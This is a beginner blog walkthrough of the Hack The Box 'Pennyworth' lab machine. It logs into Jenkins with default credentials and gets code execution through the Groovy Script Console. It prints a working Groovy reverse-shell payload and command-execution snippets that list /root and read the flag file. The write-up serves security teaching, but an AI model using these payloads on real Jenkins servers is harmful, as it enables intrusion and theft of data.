<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Pennyworth - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,pennyworth,tier-1,vip-tier,web,common-applications,jenkins,java,reconnaissance,remote-code-execution,default-credentials"><meta name=description content="The aim of this walkthrough is to provide help with the Pennyworth machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/pennyworth/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Pennyworth - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Pennyworth machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/pennyworth/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-10T08:00:00+00:00"><meta property="article:modified_time" content="2023-05-10T08:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Pennyworth - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Pennyworth machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Pennyworth - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/pennyworth/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Pennyworth - Walkthrough","name":"HTB - Pennyworth - Walkthrough","description":"The aim of this walkthrough is to provide help with the Pennyworth machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","pennyworth","tier-1","vip-tier","web","common-applications","jenkins","java","reconnaissance","remote-code-execution","default-credentials"],"articleBody":"The aim of this walkthrough is to provide help with the Pennyworth machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-luovj0ahiq]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-luovj0ahiq]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-luovj0ahiq]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-luovj0ahiq]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-luovj0ahiq]─[~/Desktop] └──╼ $ TASK 1 Question: What does the acronym CVE stand for?\nLooking up cve online delivers as expected.\ncommon vulnerabilities and exposures\nTASK 2 Question: What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?\nJust like before, using a quick internet search should provide us with the correct answer.\nconfidentiality, integrity, availability\nTASK 3 Question: What is the version of the service running on port 8080?\nAs always, we start out with a quick connection check.\n┌─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $ping $rhost -c 4 PING 10.129.167.232 (10.129.167.232) 56(84) bytes of data. 64 bytes from 10.129.167.232: icmp_seq=1 ttl=63 time=11.1 ms 64 bytes from 10.129.167.232: icmp_seq=2 ttl=63 time=11.1 ms 64 bytes from 10.129.167.232: icmp_seq=3 ttl=63 time=11.3 ms 64 bytes from 10.129.167.232: icmp_seq=4 ttl=63 time=11.0 ms --- 10.129.167.232 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 10.990/11.105/11.251/0.095 ms ┌─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $ We continue with scanning the top 1000 tcp ports on our target with both the -sC option (for default scripts usage) and the -sV option (determine the running service and it’s version) set.\n┌─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $nmap -sC -sV $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 11:13 BST Nmap scan report for 10.129.167.232 Host is up (0.084s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 8080/tcp open http Jetty 9.4.39.v20210325 |_http-server-header: Jetty(9.4.39.v20210325) | http-robots.txt: 1 disallowed entry |_/ |_http-title: Site doesn't have a title (text/html;charset=utf-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds ┌─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $ It looks like our target is running a web server.\nJetty 9.4.39.v20210325\nTASK 4 Question: What version of Jenkins is running on the target?\nUsing whatweb to get a fingerprint of the server does reveal some interesting information. Like the fact that it uses Jenkins and that direct access to the landing page - http://$rhost:8080/ - is forbidden.\n┌─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $whatweb http://$rhost:8080/ http://10.129.167.232:8080/ [403 Forbidden] Cookies[JSESSIONID.44a92248], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.39.v20210325)], HttpOnly[JSESSIONID.44a92248], IP[10.129.167.232], Jenkins[2.289.1], Jetty[9.4.39.v20210325], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session] http://10.129.167.232:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.44a92248], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.39.v20210325)], HttpOnly[JSESSIONID.44a92248], IP[10.129.167.232], Jenkins[2.289.1], Jetty[9.4.39.v20210325], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin] ┌─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $ Interestingly, once we try to access the webpage in our browser, we are redirected to a Jenkins login page.\n2.289.1\nTASK 5 Question: What type of script is accepted as input on the Jenkins Script Console?\nNot quite done with recon, so we continue. But, since\nthe landing page is restricted, accessing the landing page triggers redirection to the login page, our dir busting with gobuster will fail in it’ default configuration.\n┌─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $gobuster dir -u http://$rhost:8080/ -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.167.232:8080/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/05/10 11:38:05 Starting gobuster in directory enumeration mode =============================================================== Error: the server returns a status code that matches the provided options for non existing urls. http://10.129.167.232:8080/b001707e-91a0-419c-a1d1-e48f1ebbffcc =\u003e 403 (Length: 613). To continue please exclude the status code, the length or use the --wildcard switch ┌─[✗]─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $ Nevertheless, gobuster is nice enough to give us some ideas to try out. One of them is simply excluding the 403 Forbidden response status code from the results.\n┌─[✗]─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $gobuster dir -u http://$rhost:8080/ -w /usr/share/wordlists/dirb/common.txt -b 403 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.167.232:8080/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 403 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/05/10 11:38:08 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 302) [Size: 0] [--\u003e http://10.129.167.232:8080/assets/] /error (Status: 400) [Size: 6241] /favicon.ico (Status: 200) [Size: 17542] /git (Status: 302) [Size: 0] [--\u003e http://10.129.167.232:8080/git/] /login (Status: 200) [Size: 2028] /logout (Status: 302) [Size: 0] [--\u003e http://10.129.167.232:8080/] /meta-inf (Status: 404) [Size: 452] /META-INF (Status: 404) [Size: 452] /robots.txt (Status: 200) [Size: 71] /signup (Status: 404) [Size: 6205] /WEB-INF (Status: 404) [Size: 451] /web-inf (Status: 404) [Size: 451] =============================================================== 2023/05/10 11:38:14 Finished =============================================================== ┌─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $ Checking out the pages that we found does reveal some interesting information. One of them is the content of the robots.txt.\n┌─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $curl http://$rhost:8080/robots.txt # we don't want robots to click \"build\" links User-agent: * Disallow: / ┌─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ $ An other one is the search bar that we can access by opening either the - http://$rhost:8080/error - or the - http://$rhost:8080/signup - page.\nAdditionally, one other thing maybe worth looking into is the modified url.\nSearching for - test - via the search bar on the /signup page redirects us to the login page but with some interesting url parameter values:\nhttp://10.129.167.232:8080/login?from=%2Fsearch%2F%3Fq%3Dtest%26Jenkins-Crumb%3D52fd38b432dda0661460c3d9e6e473ee555c5c688bd0fd48d113d183eb28a7ed Once we url decode it (online decoder or using the decoder in burp) it becomes:\nhttp://10.129.167.232:8080/login?from=/search/?q=test\u0026Jenkins-Crumb=52fd38b432dda0661460c3d9e6e473ee555c5c688bd0fd48d113d183eb28a7ed Doing a quick online search on Jenkins-Crumb reveals that it might be used as a protection against CSRF (cross-site-request-forgery) attacks. Here is the info we found on the computed hash part:\nThe Default Crumb Issuer encodes the following information in the hash used as crumb: - The user name that the crumb was generated for - The web session ID that the crumb was generated in - The IP address of the user that the crumb was generated for - A salt unique to this Jenkins instance We take a note of if and we continue with our recon.\nSince we already found a login page, let us try some default credentials. We get lucky fairly quickly: it is still left with the\ndefault credentials username root password password configured. Once we log in, we are welcomed with a Dashboard and a couple of other control options.\nBut since this is our first login, we must take a proper look around. One possibly (very) important discovery we make is the Script Console. It is accessible via Manage Jenkins (#1) -\u003e Script Console (#2) or directly accessing - http://$rhost:8080/script - once already authenticated.\nOne thing we take a note of is the Script Console's description.\nType in an arbitrary Groovy script and execute it on the server. ... It not only directly solves the current TASK for us, but it also provides us with a hint that can help us with planning our next course of actions.\nWe run the given example command to verify if the console really works.\n/* example command */ println(Jenkins.instance.pluginManager.plugins) And in fact it does, it even displays the output for us. How nice… but also, how dangerous.\ngroovy\nTASK 6 Question: What would the \"String cmd\" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?\nThe way the command execution that we found in TASK5 actually works is quite simple:\nwe feed the Script Console a groovy script (in this case our crafted payload) the script get’s executed on the target system output is displayed under Result Since we already found the vulnerability, we already inspected it, tested it, it is now finally time to exploit it. One of the first exploits that we find online is this one:\nString host=\"localhost\"; int port=8044; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u003e0)so.write(pi.read());while(pe.available()\u003e0)so.write(pe.read());while(si.available()\u003e0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); This would in theory - once run on our target - spawn a reverse shell and connect back to us (our local machine). It’s nice and it does in fact answer our TASK, but how about something simpler, something else…\nThis is one of the other exploits we found:\ndef sout = new StringBuilder(), serr = new StringBuilder() def proc = 'ls'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println \"out\u003e $sout err\u003e $serr\" In principle, it would simply execute the command that is placed between the two apostrophes - ''.execute() - on our target, and display the results on the webpage. Once run, this is the result we get back:\nout\u003e bin boot cdrom dev etc home lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var err\u003e It look’s like we are located in our target system’s root (/) directory. Looking around a bit, like with\n... def proc = 'ls /root/'.execute() ... reveals our flag’s location at - /root/flag.txt -.\ncmd.exe\nTASK 7 Question: What is a different command than \"ip a\" we could use to display our network interfaces’ information on Linux?\nUsing the internet never get’s old.\nifconfig\nTASK 8 Question: What switch should we use with netcat for it to use UDP transport mode?\nAnd neither does using a command’s built-in help option.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~/pennyworth] └──╼ [★]$ nc --help Ncat 7.93 ( https://nmap.org/ncat ) Usage: ncat [options] [hostname] [port] Options taking a time assume seconds. Append 'ms' for milliseconds, 's' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms). ... -u, --udp Use UDP instead of default TCP ... -u\nTASK 9 Question: What is the term used to describe making a target host initiate a connection back to the attacker host?\nOne of the exploits we found in TASK6 does exactly this.\nreverse shell\nSUBMIT FLAG Question: Submit root flag\nSince we already located the flag in TASK6, all that’s left to do is to modify our exploit so that it directly displays the flag.\ndef sout = new StringBuilder(), serr = new StringBuilder() def proc = 'cat /root/flag.txt'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println \"out\u003e $sout err\u003e $serr\" Once run, the flag is visible under Result.\nflag\nCongratulations, we just successfully pwned the target machine. All we have left to do now is to terminate the target box (if not terminated automatically) before we continue with the next box!\n","wordCount":"1783","inLanguage":"en","datePublished":"2023-05-10T08:00:00Z","dateModified":"2023-05-10T08:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/pennyworth/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Pennyworth - Walkthrough</h1><div class=post-meta><span title='2023-05-10 08:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1783 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#task-8><strong>TASK 8</strong></a></li><li><a href=#task-9><strong>TASK 9</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Pennyworth</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 1</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>What does the acronym CVE stand for?</em></p><p>Looking up <strong>cve</strong> online delivers as expected.</p><blockquote><p>common vulnerabilities and exposures</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?</em></p><p>Just like before, using a <strong>quick internet search</strong> should provide us with the correct answer.</p><blockquote><p>confidentiality, integrity, availability</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>What is the version of the service running on port 8080?</em></p><p>As always, we start out with a quick <strong>connection check</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$ping</span> <span class=nv>$rhost</span> -c <span class=m>4</span>
</span></span><span class=line><span class=cl>PING 10.129.167.232 <span class=o>(</span>10.129.167.232<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.167.232: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>11.1 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.167.232: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>11.1 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.167.232: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>11.3 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.167.232: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>11.0 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.167.232 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3005ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 10.990/11.105/11.251/0.095 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We continue with <strong>scanning</strong> the top 1000 tcp ports on our <strong>target</strong> with both the <em>-sC</em> option (for default scripts usage) and the <em>-sV</em> option (determine the running service and it&rsquo;s version) set.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$nmap</span> -sC -sV <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-10 11:13 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.167.232
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.084s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>999</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>8080/tcp open  http    Jetty 9.4.39.v20210325
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Jetty<span class=o>(</span>9.4.39.v20210325<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-robots.txt: <span class=m>1</span> disallowed entry 
</span></span><span class=line><span class=cl><span class=p>|</span>_/
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=p>;</span><span class=nv>charset</span><span class=o>=</span>utf-8<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 7.82 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>It looks like our <strong>target</strong> is running a <strong>web server</strong>.</p><blockquote><p>Jetty 9.4.39.v20210325</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>What version of Jenkins is running on the target?</em></p><p>Using <em><strong>whatweb</strong></em> to get a <strong>fingerprint</strong> of the server does reveal some interesting information. Like the fact that it uses <em><strong>Jenkins</strong></em> and that direct access to the landing page - <em>http://$rhost:8080/</em> - is forbidden.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$whatweb</span> http://<span class=nv>$rhost</span>:8080/
